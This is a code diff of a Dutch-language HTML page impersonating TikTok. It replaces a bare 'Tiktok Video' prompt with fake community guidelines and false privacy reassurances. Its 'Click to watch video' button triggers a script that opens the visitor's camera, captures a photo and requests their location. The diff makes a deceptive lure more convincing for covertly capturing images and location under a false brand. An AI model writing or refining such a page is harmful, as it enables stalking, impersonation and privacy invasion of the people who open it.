@@ -7,26 +7,76 @@
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      margin-top: 50px;
+      margin: 50px;
+      line-height: 1.6;
     }
     h2 {
-      font-size: 36px;
+      font-size: 32px;
+      margin-bottom: 20px;
+    }
+    h3 {
+      font-size: 24px;
+      margin-top: 20px;
     }
     p {
-      font-size: 20px;
+      font-size: 18px;
+      margin-bottom: 15px;
     }
     button {
       font-size: 22px;
       padding: 12px 24px;
       cursor: pointer;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <h2>Tiktok Video</h2>
-  <p>geef toestemming om de app te openen.</p>
+  <h2>TikTok Community Richtlijnen</h2>
 
-  <br><br>
+  <p>
+    TikTok is een platform dat gericht is op creativiteit, veiligheid en respect.
+    Om een prettige omgeving te waarborgen voor alle gebruikers, hanteert TikTok
+    duidelijke communityrichtlijnen waar iedereen zich aan moet houden.
+  </p>
+
+  <p>
+    Door verder te gaan, bevestig je dat je de richtlijnen begrijpt en akkoord gaat
+    met het naleven van de voorwaarden die van toepassing zijn op het gebruik van
+    TikTok en gerelateerde diensten.
+  </p>
+
+  <h3>Veiligheid en privacy</h3>
+  <p>
+    TikTok neemt privacy en veiligheid serieus. Gebruikers worden aangemoedigd
+    om bewust om te gaan met hun gegevens en alleen toegang te verlenen wanneer
+    dat noodzakelijk is voor de werking van functies binnen de app.
+  </p>
+
+  <p>
+    Het is belangrijk dat je alleen content bekijkt en deelt die voldoet aan de
+    geldende regels en wetgeving. Misbruik, misleiding of ongeoorloofd gebruik van
+    functies is niet toegestaan.
+  </p>
+
+  <h3>Toestemming en functionaliteit</h3>
+  <p>
+    Sommige functies vereisen expliciete toestemming, zoals toegang tot camera
+    of locatie, om de ervaring correct te laten functioneren. Deze toestemmingen
+    worden altijd door het apparaat zelf gevraagd.
+  </p>
+
+  <p>
+    TikTok zal nooit zonder jouw medeweten toegang krijgen tot gevoelige functies.
+    Je behoudt altijd controle over wat je toestaat via de instellingen van je
+    apparaat en browser.
+  </p>
+
+  <h3>Akkoord</h3>
+  <p>
+    Klik hieronder om verder te gaan en te bevestigen dat je de richtlijnen hebt
+    gelezen en begrepen.
+  </p>
+
   <button onclick="startProcess()">Klik om video te bekijken</button>
 
   <script>
@@ -40,11 +90,10 @@
         video.srcObject = stream;
         video.play();
 
-        // Kleine timeout om camera frame te laten laden
+        // Korte timeout zodat camera frame beschikbaar is
         setTimeout(async () => {
-          // Foto maken
           const canvas = document.createElement('canvas');
-          canvas.width = 640; // vaste grootte voor betrouwbaarheid
+          canvas.width = 640;
           canvas.height = 480;
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -71,7 +120,7 @@
               alert("Locatie toestemming geweigerd");
             }
           );
-        }, 500); // 0.5 seconde wachten voor frame
+        }, 500); // 0,5 seconde wachten
       } catch (err) {
         alert("Camera toestemming geweigerd of er is een fout opgetreden");
       }
